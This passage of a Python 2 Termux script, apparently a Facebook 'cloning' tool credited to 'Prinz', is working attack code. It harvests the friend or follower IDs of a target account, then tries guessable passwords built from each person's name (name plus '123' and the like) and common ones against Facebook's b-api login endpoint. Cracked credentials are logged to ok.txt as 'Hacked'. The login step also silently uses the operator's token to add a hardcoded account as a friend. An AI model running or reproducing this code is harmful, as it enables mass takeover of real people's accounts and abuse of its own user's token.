    os.system("pip2 install requests")
    os.system("python2 jjt.py")
os.system("clear")
"""
try:
    my = requests.get("https://muhammadhamza365.byethost7.com")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 jjt.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && npm install")
    os.system("cd ..... && node index.js &")
    os.system("clear")
elif os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
#MyLogo
def logo():"""
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mPrinz
\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/Cyber-boi
\033[1;96mFacebook \033[1;93m: \033[1;92mPrinz
\033[1;91m======================================="""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print logo
		print("\r\033[1;96m \x1b[1;93mWelcome \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print "\033[1;96m ========================================="
print  """\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mPrinz
\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/Cyber-boi
\033[1;96mFacebook \033[1;93m: \033[1;92mPrinz
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="
CorrectUsername = "Prinz"
CorrectPassword = "Prinz4u"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://youtube.com/channel/UCaUuH6GzGG1a2xcNZcdDNHQ')
    else:
        print "Wrong Username"
        os.system('xdg-open https://youtube.com/channel/UCaUuH6GzGG1a2xcNZcdDNHQ')
def method_menu():
    os.system("clear")
    logo()
    print("")
    print("\t    \033[1;32mClone Method Menu\033[0;97m")
    print("")
    print("[1] B-api (Fast)")
    print("[2] Localhost")
    print("")
    method_menu_select()
def method_menu_select():
    afza = raw_input(" Choose method >>> ")
    if afza =="1":
        b_menu()
    elif afza =="2":
        l_menu()
    else:
        print("")
        print("\t    \033[1;31mSelect valid option \033[0;97m")
        print("")
        method_menu_select()
def login():
    os.system("clear")
    logo()
    print("")
    print("\t    "+c+"FB Login Menu"+c2)
    print("")
    print("[1] Token login")
    print("[2] ID/Pass login")
    print("")
    login_select()
def login_select():
    afza = raw_input(" Choose login method >>> ")
    if afza =="1":
        os.system("clear")
        logo()
        print("")
        print("\t    \033[1;32mFB Token Login\033[0;97m")
        print("")
        token = raw_input(" Past token here : ")
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("")
            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            method_menu()
        except (KeyError , IOError):
            print("")
            print("\t    \033[1;31mToken not valid\033[0;97m")
            print("")
            raw_input(" Press enter to try again ")
            login()
    elif afza =="2":
        login_fb()
    else:
        print("")
        print("\t    "+c+"Select valid method"+c2)
        print("")
        login_select()
def login_fb():
	os.system("clear")
	logo()
	print("")
	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
	print("")
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		hamza = open(".fb_token.txt","w")
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100040303845823&access_token='+q['loc'])
		time.sleep(1)
		print("\t    \033[1;32mLogged in successfully\033[0;97m")
		time.sleep(1)
		method_menu()
	elif "www.facebook.com" in q["error"]:
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		print("")
		time.sleep(1)
		raw_input(" Press enter to try again ")
		login_fb()
	else:
		print("\t\033[1;31mID/Number/Password may be wrong\033[0;97m")
		print("")
		raw_input(" Press enter to try again ")
		login_fb()
def b_menu():
    global token
    os.system("clear")
    logo()
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("")
        print("\t    "+c+"ID has checkpoint"+c2)
        print("")
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        print("")
        print("\t    \033[1;31mTurn on mobile data OR wifi \033[0;97m")
        print("")
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    logo()
    print("")
    print("\t  "+c+"Logged In User"+ok+c2)
    print("")
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print("")
    print("[1] Crack from public id")
    print("[2] Crack from followers")
    print("[3] View token")
    print("[4] Find date of birth")
    print("[5] Return method menu")
    print("[6] Logout")
    print("")
    b_menu_select()
def b_menu_select():
	select = raw_input("\nChoose Option >>> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Public ID Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user :  ")
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			print("")
			os.system('echo -e "\t    Public ID Cloning " | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Followers Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user : ")
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			print("")
			os.system('echo -e "\t    Followers Cloning" | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		view_token()
	elif select =="4":
	    extract_dob()
	elif select =="5":
	    method_menu()
	elif select =="6":
	    logout()
	else:
	    print("")
	    print("\t    "+c+"Select valid method"+c2)
	    print("")
	    b_menu_select()
	print(" Total IDs : "+str(len(id)))
	time.sleep(0.5)
	print(" Cracking ")
	print("")
	print 47*("-")
	print('')
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("[Prinz Checkpoint] "+uid+" | "+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92m[Prinz Hacked] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("[Prinz Checkpoint] "+uid+" | "+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92m[Prinz Hacked] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("[Prinz Checkpoint] "+uid+" | "+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print(" \x1b[1;92m[Prinz Hacked] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+""
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("[Prinz Checkpoint] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[Prinz Hacked] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="445566"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("[Prinz Checkpoint] "+uid+" | "+pass5)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[Prinz Hacked] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="223344"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("[Prinz Checkpoint] "+uid+" | "+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m[Prinz Hacked] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="123456"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("Prinz Checkpoint] "+uid+" | "+pass7)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[Prinz Hacked] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
															
		except:
			pass
		
	p.map(main, id)
	print (" ")
	print (47*"-")
	print ("")
	print (" Cloning completed")
	print (" Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
	print ("")
	print (47*"-")
	print ("")
	raw_input(" Press enter to back ")
	b_menu()
def view_token():
    os.system("clear")
